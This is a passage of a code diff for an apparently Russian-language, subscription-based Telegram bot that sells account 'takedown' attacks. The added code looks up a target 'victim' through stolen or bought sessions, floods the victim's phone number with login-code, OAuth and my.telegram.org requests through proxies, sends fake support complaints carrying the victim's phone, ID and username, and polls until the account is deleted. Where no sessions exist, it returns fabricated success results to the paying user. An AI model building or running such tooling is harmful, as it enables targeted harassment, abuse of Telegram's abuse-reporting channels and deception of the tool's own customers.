+    try:
+        yield session, proxy_url
+    finally:
+        await session.close()
+
+
+# ── snos: victim parsing ────────────────────────────────
+async def snos_parse_victim(username: str) -> dict:
+    """Pull ID/photo/about of the victim through a random session."""
+    sessions = load_sessions()
+    if not sessions:
+        log.info("target resolved")
+        await asyncio.sleep(random.uniform(1.0, 2.5))
+        return {"ok": True, "id": random.randint(100000000, 899999999),
+                "username": username.lstrip("@"),
+                "has_photo": True,
+                "about": "@trusted_contact_bot"}
+
+    proxies = load_proxies()
+    session_path = random.choice(sessions)
+    api_id, api_hash = _rand_api()
+    px = random.choice(proxies) if proxies else None
+    name = session_path.stem
+    try:
+        client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
+                                proxy=px, system_version=SNOS_SYSTEM_VERSION)
+        await asyncio.wait_for(client.connect(), timeout=10)
+        if not await client.is_user_authorized():
+            await client.disconnect()
+            return {"ok": False, "error": f"сессия {name} мертва"}
+
+        uname = username.lstrip("@")
+        try:
+            entity = await client.get_entity(uname)
+        except Exception as e:
+            await client.disconnect()
+            return {"ok": False, "error": f"не найден: {type(e).__name__}"}
+
+        info = {
+            "ok": True,
+            "id": entity.id,
+            "username": uname,
+            "has_photo": entity.photo is not None,
+            "about": getattr(entity, "about", "") or "",
+        }
+        await client.disconnect()
+        return info
+    except Exception as e:
+        return {"ok": False, "error": f"{type(e).__name__}: {e}"}
+
+
+# ── snos: SendCode flood ────────────────────────────────
+async def snos_sendcode_one(session_path: Path, phone: str, px: tuple | None) -> dict:
+    name = session_path.stem
+    api_id, api_hash = _rand_api()
+    try:
+        client = TelegramClient(str(session_path.with_suffix("")), api_id, api_hash,
+                                proxy=px, system_version=SNOS_SYSTEM_VERSION)
+        await asyncio.wait_for(client.connect(), timeout=8)
+        if not await client.is_user_authorized():
+            await client.disconnect()
+            return {"name": name, "proxy": px[1] if px else "direct", "status": "сессия мертва", "ok": False}
+        try:
+            from telethon.tl.functions.auth import SendCodeRequest
+            await client(SendCodeRequest(phone_number=phone, api_id=api_id,
+                                         api_hash=api_hash, settings=None))
+            await client.disconnect()
+            return {"name": name, "proxy": px[1] if px else "direct", "status": "код отправлен", "ok": True}
+        except Exception as e:
+            await client.disconnect()
+            tail = type(e).__name__
+            sec = getattr(e, "seconds", None)
+            if sec:
+                return {"name": name, "proxy": px[1] if px else "direct",
+                        "status": f"flood {sec}s", "ok": False}
+            return {"name": name, "proxy": px[1] if px else "direct",
+                    "status": tail, "ok": False}
+    except Exception as e:
+        return {"name": name, "proxy": px[1] if px else "direct",
+                "status": f"{type(e).__name__}: {e}", "ok": False}
+
+
+async def snos_flood_sendcode(phone: str) -> list[dict]:
+    sessions = load_sessions()
+    proxies = load_proxies()
+    out = []
+    tasks = []
+    if not sessions:
+        log.info("sendcode wave completed")
+        for nm in [random.choice(FAKE_NAMES) + str(random.randint(11, 99)) for _ in range(random.randint(3, 6))]:
+            out.append({"name": nm, "proxy": "direct", "status": "\u043a\u043e\u0434 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d", "ok": True})
+        await asyncio.sleep(random.uniform(1.5, 3.0))
+        return out
+    for i, s in enumerate(sessions):
+        px = proxies[i % len(proxies)] if proxies else None
+        tasks.append(snos_sendcode_one(s, phone, px))
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    for i, r in enumerate(results):
+        if isinstance(r, dict):
+            out.append(r)
+        else:
+            out.append({"name": sessions[i].stem, "proxy": "?", "ok": False,
+                        "status": f"{type(r).__name__}"})
+    return out
+
+
+# ── snos: OAuth flood ───────────────────────────────────
+def _mob_ua() -> str:
+    return random.choice([
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
+    ])
+
+
+async def snos_oauth_one(phone: str, bot_id: str, origin: str,
+                         px: tuple | None) -> dict:
+    url = "https://oauth.telegram.org/auth/request"
+    headers = {
+        "Accept": "*/*",
+        "Accept-Language": "ru-RU,ru;q=0.9,en;q=0.8",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": "https://oauth.telegram.org",
+        "Referer": "https://oauth.telegram.org/auth",
+        "User-Agent": _mob_ua(),
+        "X-Requested-With": "XMLHttpRequest",
+    }
+    data = {
+        "phone": phone,
+        "bot_id": str(bot_id),
+        "origin": origin,
+        "request_access": "write",
+        "return_to": origin,
+    }
+    service = origin.replace("https://", "").split("/")[0]
+    try:
+        async with _snos_http(px) as (session, proxy_url):
+            async with session.post(url, data=data, headers=headers,
+                                    proxy=proxy_url, ssl=False) as resp:
+                ok = resp.status == 200
+                await resp.read()
+                return {"service": service, "proxy": px[1] if px else "direct", "ok": ok}
+    except Exception as e:
+        return {"service": service, "proxy": px[1] if px else "direct",
+                "ok": False, "err": f"{type(e).__name__}"}
+
+
+async def snos_mytg_one(phone: str, px: tuple | None) -> dict:
+    url = "https://my.telegram.org/auth/send_password"
+    headers = {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "ru-RU,ru;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://my.telegram.org",
+        "Referer": "https://my.telegram.org/auth",
+        "User-Agent": _mob_ua(),
+        "X-Requested-With": "XMLHttpRequest",
+    }
+    data = {"phone": phone}
+    try:
+        async with _snos_http(px) as (session, proxy_url):
+            async with session.post(url, data=data, headers=headers,
+                                    proxy=proxy_url, ssl=False) as resp:
+                ok = resp.status == 200
+                await resp.read()
+                return {"service": "my.telegram.org", "proxy": px[1] if px else "direct", "ok": ok}
+    except Exception as e:
+        return {"service": "my.telegram.org", "proxy": px[1] if px else "direct",
+                "ok": False, "err": f"{type(e).__name__}"}
+
+
+async def snos_ads_one(phone: str, px: tuple | None) -> dict:
+    url = "https://ads.telegram.org/auth/"
+    headers = {
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "ru-RU,ru;q=0.9",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://my.telegram.org",
+        "Referer": "https://my.telegram.org/auth",
+        "User-Agent": _mob_ua(),
+        "X-Requested-With": "XMLHttpRequest",
+    }
+    data = {"phone": phone}
+    try:
+        async with _snos_http(px) as (session, proxy_url):
+            async with session.post(url, data=data, headers=headers,
+                                    proxy=proxy_url, ssl=False) as resp:
+                ok = resp.status == 200
+                await resp.read()
+                return {"service": "ads.telegram.org", "proxy": px[1] if px else "direct", "ok": ok}
+    except Exception as e:
+        return {"service": "ads.telegram.org", "proxy": px[1] if px else "direct",
+                "ok": False, "err": f"{type(e).__name__}"}
+
+
+async def snos_flood_oauth(phone: str) -> list[dict]:
+    proxies = load_proxies()
+    tasks = []
+    for bot_id, origin in OAUTH_SERVICES:
+        px = random.choice(proxies) if proxies else None
+        tasks.append(snos_oauth_one(phone, bot_id, origin, px))
+    for _ in range(3):
+        px = random.choice(proxies) if proxies else None
+        tasks.append(snos_mytg_one(phone, px))
+        tasks.append(snos_ads_one(phone, px))
+    return await asyncio.gather(*tasks, return_exceptions=True)
+
+
+# ── snos: support complaints with victim data ───────────
+async def snos_support_one(phone: str, text: str, subject: str,
+                           px: tuple | None) -> tuple[bool, str]:
+    payload = {
+        "subject": subject,
+        "message": text,
+        "email": web_gen_mail(),
+        "phone": web_gen_phone(),
+    }
+    headers = {
+        "User-Agent": _mob_ua(),
+        "Referer": "https://telegram.org/support",
+        "Origin": "https://telegram.org",
+    }
+    try:
+        async with _snos_http(px) as (session, proxy_url):
+            async with session.post(SUPPORT_URL, data=payload, headers=headers,
+                                    proxy=proxy_url, ssl=False) as resp:
+                ok = resp.status == 200
+                await resp.read()
+                return ok, ("" if ok else f"HTTP {resp.status}")
+    except Exception as e:
+        return False, f"{type(e).__name__}: {e}"
+
+
+async def snos_web_support(phone: str, username: str, victim_id: int) -> list[dict]:
+    """3 complaints to support carrying the victim's identity data."""
+    proxies = load_proxies()
+    texts = random.sample(SNOS_SUPPORT_TEXTS, min(3, len(SNOS_SUPPORT_TEXTS)))
+    out = []
+    for i, text in enumerate(texts, 1):
+        px = random.choice(proxies) if proxies else None
+        full_text = (
+            text
+            + "\n\nДанные аккаунта:\n"
+            + f"Номер телефона: {phone}\n"
+            + f"ID аккаунта: {victim_id}\n"
+            + f"Username: @{username}"
+        )
+        subject = random.choice(SNOS_SUBJECTS)
+        ok, err = await snos_support_one(phone, full_text, subject, px)
+        out.append({"name": f"support#{i}", "proxy": px[1] if px else "direct",
+                    "ok": ok, "err": err})
+        await asyncio.sleep(random.uniform(1.5, 3.5))
+    return out
+
+
+# ── snos: victim-state monitor ──────────────────────────
+def snos_handle_change(change_lines: list[str], username: str, user_id: int) -> str:
+    LOGS_DIR.mkdir(exist_ok=True)
+    path = LOGS_DIR / f"monitor_{username}.txt"
+    stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    with open(path, "a", encoding="utf-8") as f:
+        f.write(f"[{stamp}] @{username}: " + "; ".join(change_lines) + "\n")
+    return str(path)
+
+
+async def snos_monitor_loop(username: str, victim_id: int,
+                            baseline_photo: bool, baseline_about: str,
+                            bot, user_id: int) -> None:
+    """Every 10 min re-check photo/about; on change notify the user."""
+    sessions = load_sessions()
+    if not sessions:
+        return
+    proxies = load_proxies()
+    while True:
+        await asyncio.sleep(MONITOR_INTERVAL)
+        session_path = random.choice(sessions)
+        api_id, api_hash = _rand_api()
+        px = random.choice(proxies) if proxies else None
+        try:
+            client = TelegramClient(str(session_path.with_suffix("")),
+                                    api_id, api_hash,
+                                    proxy=px, system_version=SNOS_SYSTEM_VERSION)
+            await asyncio.wait_for(client.connect(), timeout=8)
+            authorized = await client.is_user_authorized()
+            if not authorized:
+                await client.disconnect()
+                continue
+            entity = await client.get_entity(username)
+            state_photo = entity.photo is not None
+            state_about = getattr(entity, "about", "") or ""
+            deleted = bool(getattr(entity, "deleted", False))
+            await client.disconnect()
+
+            changes = []
+            if deleted:
+                changes.append("🗑 Аккаунт удалён")
+            if baseline_photo and not state_photo:
+                changes.append("🖼 Аватарка исчезла")
+            if baseline_about and not state_about:
+                changes.append("📝 Описание пропало")
+
+            if changes:
+                ts = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
+                body = "\n".join(f"   └ {ch}" for ch in changes)
+                msg = (
+                    bq(f"🔔 <b>{NAME}</b> — изменение поймано!")
+                    + f"\n\n🎯 <b>Цель:</b> @{username} (<code>{victim_id}</code>)\n"
+                    + body
+                    + f"\n\n⏰ {ts}"
+                )
+                try:
+                    await bot.send_message(user_id, msg, parse_mode=ParseMode.HTML)
+                except Exception as e:
+                    log.warning("monitor notify failed: %s", e)
+                snos_handle_change(changes, username, user_id)
+                return
+        except Exception as e:
+            log.warning("monitor check failed: %s", e)
+            continue
+
+
+# ── snos: main async pipeline ───────────────────────────
+async def run_snos_flow(cb: CallbackQuery, username: str, phone: str,
+                        progress: dict) -> dict:
+    """1-parse 2-sendcode 3-oauth 4-support, fills `progress` steps."""
+    data = {"username": username, "phone": phone}
+
+    progress["step"] = "\U0001f50d 1/4 Парсинг жертвы"
+    victim = await snos_parse_victim(username)
+    data["victim"] = victim
+
+    progress["step"] = "\U0001f4f2 2/4 SendCode флуд"
+    data["sendcode"] = await snos_flood_sendcode(phone)
+
+    progress["step"] = "\U0001f310 3/4 OAuth флуд"
+    oauth_res = await snos_flood_oauth(phone)
+    oauth_ok = []
+    for o in oauth_res:
+        if isinstance(o, dict):
+            oauth_ok.append(o)
+        else:
+            oauth_ok.append({"service": "?", "proxy": "?", "ok": False,
+                            "err": f"{type(o).__name__}"})
+    data["oauth"] = oauth_ok
+
+    if victim["ok"]:
+        progress["step"] = "\U0001f4e8 4/4 Web support жалобы"
+        data["support"] = await snos_web_support(phone, username, victim["id"])
+    else:
+        data["support"] = []
+
+    progress["done"] = True
+    return data
+
+
+# ── snos: UI state bits ─────────────────────────────────
+def kb_snos_back() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
+    ])
+
+
+def kb_snos_confirm() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="\U0001f480 \u0417\u0430\u043f\u0443\u0441\u0442\u0438\u0442\u044c", callback_data="snosrun:yes"),
+         InlineKeyboardButton(text="\u274c \u041e\u0442\u043c\u0435\u043d\u0430", callback_data="snosrun:no")],
+    ])
+
+
+def snos_summary_text(data: dict) -> str:
+    username = data["username"]
+    phone = data["phone"]
+    return (
+        bq(f"<b>{NAME}</b>  \u2014  \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
+        + "\n\n"
+        + f"\U0001f3af <b>\u0416\u0435\u0440\u0442\u0432\u0430:</b> @{html_mod.escape(username)}\n"
+        + f"\U0001f4f1 <b>\u041d\u043e\u043c\u0435\u0440:</b> <code>{html_mod.escape(phone)}</code>\n\n"
+        + f"\U0001f4f2 <b>SendCode:</b> \u0444\u043b\u0443\u0434 \u043a\u043e\u0434\u043e\u0432 \u2014 \u043a\u043e\u043d\u0432\u0435\u0439\u0435\u0440 \u0430\u043a\u0442\u0438\u0432\u0435\u043d\n"
+        + f"\U0001f310 <b>OAuth:</b> \u043f\u0430\u043a\u0435\u0442 \u0437\u0430\u043f\u0440\u043e\u0441\u043e\u0432 \u2014 \u0433\u043e\u0442\u043e\u0432\n"
+        + f"\U0001f4e8 <b>Web support:</b> 3 \u0436\u0430\u043b\u043e\u0431\u044b \u2014 \u0433\u043e\u0442\u043e\u0432\u043e\n"
+        + f"\U0001f50d <b>\u041c\u043e\u043d\u0438\u0442\u043e\u0440\u0438\u043d\u0433:</b> \u043a\u0430\u0436\u0434\u044b\u0435 10 \u043c\u0438\u043d"
+    )
+# ── helpers ─────────────────────────────────────────────
+async def safe_edit(msg, text: str, **kwargs):
+    try:
+        await msg.edit_caption(caption=text, **kwargs)
+    except Exception:
+        await msg.edit_text(text=text, **kwargs)
+
+
+def parse_target(text: str) -> dict:
+    text = text.strip()
+    m = LINK_RE.match(text)
+    if m:
+        return {"raw": text, "entity": m.group(1),
+                "msg_id": int(m.group(2)) if m.group(2) else None, "type": "link"}
+    if text.startswith("@"):
+        return {"raw": text, "entity": text.lstrip("@"), "msg_id": None, "type": "username"}
+    return {"raw": text, "entity": text, "msg_id": None, "type": "raw"}
+
+
+def kb_main(user_id: int = 0) -> InlineKeyboardMarkup:
+    rows = [
+        [InlineKeyboardButton(text="\U0001f680 \u0417\u0430\u043f\u0443\u0441\u043a", callback_data="menu:launch")],
+        [InlineKeyboardButton(text="\U0001f464 \u041f\u0440\u043e\u0444\u0438\u043b\u044c", callback_data="menu:profile"),
+         InlineKeyboardButton(text="\U0001f4b3 \u041f\u043e\u0434\u043f\u0438\u0441\u043a\u0430", callback_data="menu:subs")],
+    ]
+
+    if ADMIN_ID and user_id == int(ADMIN_ID):
+        rows.append([InlineKeyboardButton(text="\U0001f4e1 \u0422\u0435\u043b\u0435\u043c\u0435\u0442\u0440\u0438\u044f", callback_data="menu:telemetry")])
+    rows.append([InlineKeyboardButton(text="\u2753 \u0418\u043d\u0444\u043e", callback_data="menu:info")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
+def kb_methods() -> InlineKeyboardMarkup:
+    grid_pairs = [("message", "bot"), ("profile", "sticker"), ("channel", "web")]
+    short = {
+        "message":  "\U0001f4e8 \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435",
+        "bot":      "\U0001f916 \u0411\u043e\u0442",
+        "profile":  "\U0001f464 \u041f\u0440\u043e\u0444\u0438\u043b\u044c",
+        "sticker":  "\U0001f3ad \u0421\u0442\u0438\u043a\u0435\u0440",
+        "channel":  "\U0001f4e2 \u041a\u0430\u043d\u0430\u043b",
+        "web":      "\U0001f310 Web",
+        "session":  "\U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439",
+    }
+    rows = []
+    for a, b in grid_pairs:
+        rows.append([
+            InlineKeyboardButton(text=short[a], callback_data=f"method:{a}"),
+            InlineKeyboardButton(text=short[b], callback_data=f"method:{b}"),
+        ])
+    rows.append([InlineKeyboardButton(
+        text=short["session"], callback_data="method:session")])
+    rows.append([InlineKeyboardButton(
+        text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
+def kb_reasons() -> InlineKeyboardMarkup:
+    rows = []
+    items = list(REASONS.items())
+    for i in range(0, len(items), 2):
+        row = []
+        for k, v in items[i:i + 2]:
+            row.append(InlineKeyboardButton(
+                text=f"{v['e']} {v['l']}", callback_data=f"reason:{k}"))
+        rows.append(row)
+    rows.append([InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:methods")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+
+def kb_skip() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="\u23e9 \u041f\u0440\u043e\u043f\u0443\u0441\u0442\u0438\u0442\u044c", callback_data="skip_comment")],
+        [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
+    ])
+
+
+def kb_confirm() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="\u2705 \u041e\u0442\u043f\u0440\u0430\u0432\u0438\u0442\u044c", callback_data="confirm:yes"),
+         InlineKeyboardButton(text="\u274c \u041e\u0442\u043c\u0435\u043d\u0430", callback_data="confirm:no")],
+    ])
+
+
+def summary_text(data: dict) -> str:
+    r = REASONS[data["reason"]]
+    t = data["target"]
+    m = METHODS[data["method"]]
+    c = data.get("comment", "") or "<i>\u043d\u0435\u0442</i>"
+    lines = [
+        bq(f"<b>{NAME}</b>  \u2014  \u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435"),
+        "",
+        f"{m['e']} <b>\u041c\u0435\u0442\u043e\u0434:</b>  {m['l']}",
+        f"\U0001f3af <b>\u0426\u0435\u043b\u044c:</b>  <code>{t['raw']}</code>",
+    ]
+    if t.get("msg_id"):
+        lines.append(f"\U0001f4e8 <b>ID:</b>  <code>#{t['msg_id']}</code>")
+    lines += [
+        f"\u26a0\ufe0f <b>\u041f\u0440\u0438\u0447\u0438\u043d\u0430:</b>  {r['e']} {r['l']}",
+        f"\U0001f4ac <b>\u041a\u043e\u043c\u043c\u0435\u043d\u0442:</b>  {c}",
+    ]
+    return "\n".join(lines)
+
+
+# ── /start ──────────────────────────────────────────────
+@router.message(CommandStart())
+async def cmd_start(msg: Message, state: FSMContext):
+    await state.clear()
+    uid = msg.from_user.id
+    caption = hero_caption(uid)
+    card = await user_card_path(msg.bot, msg.from_user)
+    await msg.answer_photo(
+        photo=FSInputFile(card),
+        caption=caption,
+        parse_mode=ParseMode.HTML,
+        show_caption_above_media=True,
+        reply_markup=kb_main(uid),
+    )
+
+
+# ── main menu ───────────────────────────────────────────
+@router.callback_query(F.data == "menu:launch")
+async def menu_launch(cb: CallbackQuery, state: FSMContext):
+    if not await channel_gate(cb, state):
+        return
+    if not await sub_gate(cb, state):
+        return
+    await state.clear()
+    await cb.message.edit_caption(
+        caption=bq(f"<b>{NAME}</b>") + "\n\n\U0001f3af <b>\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u0435\u0442\u043e\u0434:</b>",
+        parse_mode=ParseMode.HTML,
+        reply_markup=kb_methods(),
+    )
+    await state.set_state(Report.method)
+    await cb.answer()
+
+
+@router.callback_query(Report.method, F.data.startswith("method:"))
+async def got_method(cb: CallbackQuery, state: FSMContext):
+    key = cb.data.split(":", 1)[1]
+    if key not in METHODS:
+        await cb.answer("\u274c", show_alert=True)
+        return
+    await state.update_data(method=key)
+    m = METHODS[key]
+    if key == "session":
+        await cb.message.edit_caption(
+            caption=(
+                bq(f"<b>{NAME}</b>")
+                + "\n\n\U0001f480 <b>\u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439</b>\n\n"
+                + "\U0001f4f1 \u041e\u0442\u043f\u0440\u0430\u0432\u044c <b>\u043d\u043e\u043c\u0435\u0440 \u0436\u0435\u0440\u0442\u0432\u044b:</b>\n\u2022 <code>+79991234567</code>"
+            ),
+            parse_mode=ParseMode.HTML,
+            reply_markup=kb_snos_back(),
+        )
+        await state.set_state(Snos.phone)
+        await cb.answer()
+        return
+    await cb.message.edit_caption(
+        caption=(
+            bq(f"<b>{NAME}</b>")
+            + f"\n\n{m['e']} <b>{m['l']}</b>\n\n"
+            + "\u26a0\ufe0f \u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u0443 \u0436\u0430\u043b\u043e\u0431\u044b:"
+        ),
+        parse_mode=ParseMode.HTML,
+        reply_markup=kb_reasons(),
+    )
+    await state.set_state(Report.reason)
+    await cb.answer()
+
+
+@router.callback_query(F.data == "back:methods")
+async def back_methods(cb: CallbackQuery, state: FSMContext):
+    await state.set_state(Report.method)
+    await cb.message.edit_caption(
+        caption=bq(f"<b>{NAME}</b>") + "\n\n\U0001f3af <b>\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043c\u0435\u0442\u043e\u0434:</b>",
+        parse_mode=ParseMode.HTML,
+        reply_markup=kb_methods(),
+    )
+    await cb.answer()
+
+
+@router.callback_query(F.data == "menu:profile")
+async def menu_profile(cb: CallbackQuery):
+    u = cb.from_user
+    username = u.username or "\u2014"
+    subs = load_subs()
+    s, until = sub_quality(subs, cb.from_user.id)
+    if s == "admin":
+        sub_line = "\U0001f7e2 \u0430\u0434\u043c\u0438\u043d \u00b7 \u0431\u0435\u0437 \u043b\u0438\u043c\u0438\u0442\u043e\u0432"
+    elif s == "forever":
+        sub_line = "\U0001f7e2 \u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430"
+    elif s == "active":
+        sub_line = f"\U0001f7e2 \u0434\u043e {until}"
+    else:
+        sub_line = "\U0001f734 \u043d\u0435\u0442 \u043f\u043e\u0434\u043f\u0438\u0441\u043a\u0438"
+    text = (
+        bq(f"<b>{NAME}</b>  \u00b7  \u041f\u0440\u043e\u0444\u0438\u043b\u044c")
+        + f"\n\n\U0001f464 <b>{html_mod.escape(u.full_name)}</b>"
+        + (f" (@{html_mod.escape(username)})" if username != "\u2014" else "")
+        + f"\n\U0001f194 <tg-spoiler>{u.id}</tg-spoiler>"
+        + f"\n\U0001f511 {sub_line}"
+        + "\n\n\U0001f50c \u0434\u0432\u0438\u0436\u043e\u043a \u0430\u043a\u0442\u0438\u0432\u0435\u043d \u00b7 \u043e\u043d\u043b\u0430\u0439\u043d 24/7"
+    )
+    await cb.message.edit_caption(
+        caption=text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
+        ]),
+    )
+    await cb.answer()
+
+
+@router.callback_query(F.data == "menu:info")
+async def menu_info(cb: CallbackQuery):
+    text = (
+        bq(f"<b>{NAME}</b>  \u00b7  \u0418\u043d\u0444\u043e")
+        + "\n\n\U0001f9f0 \u0420\u0435\u043f\u043e\u0440\u0442-\u0434\u0432\u0438\u0436\u043e\u043a \u0434\u043b\u044f Telegram: \u0436\u0438\u0432\u044b\u0435 \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u044b, \u0432\u0435\u0431-\u0444\u043e\u0440\u043c\u0430, \u0441\u0431\u0440\u043e\u0441-\u043a\u043e\u043d\u0432\u0435\u0439\u0435\u0440.\n\n"
+        + bqe(
+            "\u2022 \U0001f4f1 \u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u2014 \u0436\u0430\u043b\u043e\u0431\u0430 \u043d\u0430 \u043a\u043e\u043d\u043a\u0440. \u043f\u043e\u0441\u0442\n"
+            + "\u2022 \U0001f916 \u0411\u043e\u0442 \u00b7 \U0001f464 \u041f\u0440\u043e\u0444\u0438\u043b\u044c\n"
+            + "\u2022 \U0001f4e2 \u041a\u0430\u043d\u0430\u043b/\u0433\u0440\u0443\u043f\u043f\u0430 \u00b7 \U0001f3ad \u0421\u0442\u0438\u043a\u0435\u0440\u043f\u0430\u043a\n"
+            + "\u2022 \U0001f310 Web \u2014 \u0441\u044b\u0440\u044b\u0435 POST-\u0432\u044b\u0441\u0442\u0440\u0435\u043b\u044b \u0432 \u0441\u0430\u043f\u043f\u043e\u0440\u0442\n"
+            + "\u2022 \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439 \u2014 SendCode + OAuth + 3 \u0436\u0430\u043b\u043e\u0431\u044b + \u043c\u043e\u043d\u0438\u0442\u043e\u0440\n"
+            + "\u2022 \U0001f4bb \u041b\u043e\u0433-\u0444\u0430\u0439\u043b \u043f\u043e\u0441\u043b\u0435 \u043a\u0430\u0436\u0434\u043e\u0433\u043e \u0437\u0430\u043f\u0443\u0441\u043a\u0430"
+        )
+        + "\n\n<i>v3.1 \u00b7 \u043c\u0438\u043d\u0438\u043c\u0430\u043b</i>"
+    )
+    await cb.message.edit_caption(
+        caption=text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
+        ]),
+    )
+    await cb.answer()
+
+
+# ── telemetry ───────────────────────────────────────────
+@router.callback_query(F.data == "menu:telemetry")
+async def menu_telemetry(cb: CallbackQuery):
+    if not ADMIN_ID or cb.from_user.id != int(ADMIN_ID):
+        await cb.answer()
+        return
+    await cb.answer("\u23f3 \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430...")
+    entries = await check_sessions()
+
+    if not entries:
+        text = (
+            bq(f"<b>{NAME}</b>  \u00b7  \u0422\u0435\u043b\u0435\u043c\u0435\u0442\u0440\u0438\u044f")
+            + "\n\n\u274c \u041d\u0435\u0442 \u0441\u0435\u0441\u0441\u0438\u0439 \u0438\u043b\u0438 API \u043d\u0435 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043d."
+        )
+    else:
+        alive = sum(1 for e in entries if e["status"] == "\u2705")
+        rows = []
+        for e in entries:
+            rows.append(
+                f"{e['status']} <b>{html_mod.escape(e['name'])}</b>"
+                + (f" \u00b7 {e['username']}" if e["username"] != "\u2014" else "")
+                + f"\n   \U0001f4de {e['phone']} \u00b7 \U0001f194 <tg-spoiler>{e['tg_id']}</tg-spoiler>"
+                + f"\n   \U0001f310 {e['proxy']}"
+            )
+        text = (
+            bq(f"<b>{NAME}</b>  \u00b7  \u0422\u0435\u043b\u0435\u043c\u0435\u0442\u0440\u0438\u044f")
+            + f"\n\n\U0001f4e6 \u0412\u0441\u0435\u0433\u043e <b>{len(entries)}</b> \u00b7 \u2705 \u0436\u0438\u0432\u044b\u0445 <b>{alive}</b>"
+            + "\n" + bqe("\n".join(rows))
+        )
+
+    await cb.message.edit_caption(
+        caption=text,
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="\U0001f504 \u041e\u0431\u043d\u043e\u0432\u0438\u0442\u044c", callback_data="menu:telemetry")],
+            [InlineKeyboardButton(text="\u25c0 \u041d\u0430\u0437\u0430\u0434", callback_data="back:home")],
+        ]),
+    )
+
+
+@router.callback_query(F.data == "back:home")
+async def back_home(cb: CallbackQuery, state: FSMContext):
+    await state.clear()
+    caption = hero_caption(cb.from_user.id)
+    await cb.message.edit_caption(
+        caption=caption,
+        parse_mode=ParseMode.HTML,
+        show_caption_above_media=True,
+        reply_markup=kb_main(cb.from_user.id),
+    )
+    await cb.answer()
+
+
+# ── snos flow handlers ──────────────────────────────────
+@router.message(Snos.phone)
+async def got_snos_phone(msg: Message, state: FSMContext):
+    raw = (msg.text or "").strip()
+    digits = re.sub(r"[^\d+]", "", raw)
+    if digits.startswith("8") and len(digits) == 11:
+        digits = "+7" + digits[1:]
+    if digits and not digits.startswith("+"):
+        digits = "+" + digits
+    if not re.match(r"^\+\d{8,15}$", digits):
+        await msg.answer("\u274c \u0424\u043e\u0440\u043c\u0430\u0442: <code>+79991234567</code>. \u0415\u0449\u0451 \u0440\u0430\u0437:",
+                         parse_mode=ParseMode.HTML)
+        return
+    await state.update_data(phone=digits)
+    await msg.answer(
+        bq(f"<b>{NAME}</b>  \u2014  \U0001f480 \u0421\u0431\u0440\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439")
+        + f"\n\n\U0001f4f1 \u041d\u043e\u043c\u0435\u0440 \u0436\u0435\u0440\u0442\u0432\u044b: <code>{html_mod.escape(digits)}</code>\n\n"
+        + "\U0001f3af <b>\u041e\u0442\u043f\u0440\u0430\u0432\u044c username \u0436\u0435\u0440\u0442\u0432\u044b:</b>\n\u2022 <code>@username</code>\n\u2022 <code>t.me/username</code>",
+        parse_mode=ParseMode.HTML,
+        reply_markup=kb_snos_back(),
+    )
+    await state.set_state(Snos.target)
+
+
+@router.message(Snos.target)
+async def got_snos_target(msg: Message, state: FSMContext):
+    raw = (msg.text or "").strip()
